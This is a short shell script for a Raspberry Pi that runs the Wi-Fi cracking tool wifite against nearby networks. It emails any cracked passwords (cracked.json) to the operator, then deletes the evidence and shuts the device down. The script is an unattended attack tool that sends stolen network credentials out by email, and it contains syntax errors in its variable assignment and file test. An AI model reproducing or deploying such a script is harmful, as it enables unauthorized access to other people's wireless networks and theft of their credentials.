#!/bin/sh
sleep 30s
wifite -p 60 --kill
systemctl start postfix
my_address = username@email.com
if [ ! -f cracked.json]
then
	sendEmail -f pifi@attcking.pi -t $my_address -u "Unsuccessful Attack" -m "Plug the pi into power supply to retry."
else 
    sendEmail -f pifi@attcking.pi -t $my_address -u "Pa$$W0RD$" -a cracked.json
fi
systemctl stop postfix
rm cracked.json
shutdown now